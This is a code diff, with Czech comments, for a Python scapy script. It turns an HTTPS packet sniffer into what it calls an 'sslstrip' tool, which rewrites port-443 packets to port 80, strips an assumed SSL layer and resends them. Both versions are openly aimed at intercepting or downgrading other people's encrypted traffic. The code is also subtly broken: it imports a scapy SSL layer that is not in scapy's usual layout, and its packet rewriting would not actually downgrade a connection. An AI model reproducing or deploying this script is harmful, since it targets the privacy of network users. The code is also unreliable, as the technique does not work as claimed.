@@ -1,25 +1,31 @@
-from scapy.all import *
-import ssl
+import scapy.all as scapy
+from scapy.layers.inet import IP, TCP
+from scapy.layers.ssl import SSL
+import socket
+import threading
 
-def packet_callback(packet):
-    if packet.haslayer(TCP) and packet.haslayer(IP):
+# Mapa pro přesměrování HTTPS na HTTP
+def sslstrip(packet):
+    if packet.haslayer(SSL):
         ip_src = packet[IP].src
         ip_dst = packet[IP].dst
-        sport = packet[TCP].sport
-        dport = packet[TCP].dport
+        port_src = packet[TCP].sport
+        port_dst = packet[TCP].dport
         
-        # Filtrace pouze HTTPS provozu (port 443)
-        if dport == 443 or sport == 443:
-            print(f"HTTPS Packet captured from {ip_src}:{sport} to {ip_dst}:{dport}")
-            
-            # Zobrazíme obsah paketu
-            if packet.haslayer(Raw):
-                raw_data = packet[Raw].load
-                try:
-                    # Pokusíme se dekódovat, pokud je to nějaký HTTP požadavek
-                    print(raw_data.decode(errors="ignore"))
-                except:
-                    pass
+        if packet[TCP].dport == 443:  # HTTPS port
+            # Přesměrování na HTTP
+            packet[TCP].dport = 80  # HTTP port
+            del packet[SSL]  # Odstranění SSL vrstvy
+            scapy.send(packet)  # Odeslání upraveného paketu
+            print(f"SSL Strip: {ip_src} -> {ip_dst} (HTTPS -> HTTP)")
 
-# Naslouchání na všech paketech na síti (v tomto případě pro port 443)
-sniff(filter="tcp port 443", prn=packet_callback, store=0)
+# Vytvoření snifferu pro odchytávání paketů
+def packet_sniffer():
+    scapy.sniff(prn=sslstrip, filter="tcp", store=0)
+
+# Spuštění snifferu na samostatném vlákně
+sniffer_thread = threading.Thread(target=packet_sniffer)
+sniffer_thread.start()
+
+print("SSLstrip běží, začínám odchytávat HTTPS pakety...")
+
